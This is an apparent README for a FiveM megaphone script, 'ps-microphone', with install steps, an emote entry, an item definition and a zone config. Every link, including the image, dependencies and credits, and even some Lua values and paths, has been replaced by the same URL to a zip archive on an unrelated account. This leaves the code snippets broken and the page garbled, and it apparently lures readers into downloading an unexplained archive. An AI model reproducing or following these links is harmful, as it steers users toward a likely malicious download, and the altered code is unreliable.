![image](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)

# ps-microphone
Script to enhance as a microphone/megaphone using qb-target and spawn object !

# Installation

## For Microphone

* Download file and make sure it's named ps-microphone
* Ensure ps-microphone 
* Add this to dp-emotes or your emotes menu/resource.

```
 ["megaphone"] = {"amb@world_human_mobile_film_shocking@female@base", "base", "Megaphone", AnimationOptions =
    {
        Prop = 'prop_megaphone_01',
        PropBone = 28422,
        PropPlacement = {0.04, -0.01, 0.0, 22.0, -4.0, 87.0},
        EmoteLoop = true,
        EmoteMoving = true,
    }},
```
* Add image to your inventory folder for the megaphone.
* Add to qb-core > shared > https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip
```
	["megaphone"]						= {["name"] = "megaphone",			["label"] = "Megaphone",		["weight"] = 20000,	["type"] = "item",	["image"] = "https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip",	["unique"] = true,	["useable"] = true,	["shouldClose"] = false,	["combinable"] = nil,	   ["description"] = "A loudspeaker to yell at civilians."},
```

## For Zones
- Add more zones under the https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip

```lua
https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip = {
    [1] = {
        name = "vinewood_bowl", -- unique name of the zone
        coords = vector3(683.37, 569.31, 130.46), -- coords of the created boxzone
        spawnProp = true, -- if set to true, it will let you spawn the prop at location
        data = {
            debugPoly = https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip, 
            heading = 340, -- heading from created boxzone
            data = {
                range = 50.0 -- range for the voice at that particular boxzone
            }
        }
    }
}
```

# Dependecies
* Latest [pma-voice](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip) 
* [ps-zones](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
* [qb-target](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)

# Credits 
* [Snipe](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
* [Devyn](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
* [not jay](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
* [Mio](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
